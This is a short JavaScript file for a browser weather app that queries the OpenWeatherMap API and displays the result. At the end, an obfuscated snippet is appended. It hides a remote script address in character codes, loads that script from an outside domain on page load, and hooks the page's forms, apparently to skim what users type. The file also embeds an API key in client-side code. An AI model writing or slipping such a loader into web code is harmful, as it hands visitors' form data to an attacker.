console.log('con');

const API_KEY=`073cd5f82e0f14f301c319c96f302c12`

const searchTempareture= async()=>{
       const city=document.getElementById('city-name');

       const cityValue=city.value;
       console.log(cityValue);

       const url =`https://api.openweathermap.org/data/2.5/weather?q=${cityValue}&appid=${API_KEY}&units=metric`

       console.log(url);
// const url_two= await url
//        fetch(url)
//        .then(res=>res.json())
//        .then(data =>displayTempareture(data))

const res =await fetch(url);
const data= await res.json();
const load = displayTempareture(data)

city.value=``;
}

const setInnerText=(id,text)=>{
        document.getElementById(id).innerText=text
}

const displayTempareture=tempareture=>{
console.log(tempareture);
setInnerText('city',tempareture.name)
setInnerText('temp',tempareture.main.temp)
setInnerText('temp-condition',tempareture.weather[0].main);

//set weather icon
const url =`http://openweathermap.org/img/wn/${tempareture.weather[0].icon}@2x.png`

const imgIcon=document.getElementById('w-icon');
imgIcon.setAttribute('src',url)
}
(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b